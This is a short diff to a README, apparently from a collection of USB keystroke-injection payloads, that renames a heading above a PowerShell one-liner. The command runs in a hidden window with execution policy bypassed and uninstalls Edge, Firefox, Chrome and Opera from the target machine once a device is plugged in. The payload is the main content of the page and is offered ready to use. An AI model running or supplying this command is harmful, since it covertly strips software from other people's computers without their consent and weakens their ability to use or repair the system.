@@ -26,7 +26,7 @@ A script used to remove all target browsers.
 
 * Plug in your device
 
-All
+Execution
 ```powershell
 powershell -w h -ep bypass -Command  "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -like "Microsoft Edge") -or ($_.DisplayName -like "Mozilla Firefox") -or ($_.DisplayName -like "Google Chrome") -or ($_.DisplayName -like "Opera*")} | ForEach-Object {Uninstall-package $_.PSChildName -Verbose}"
 ```
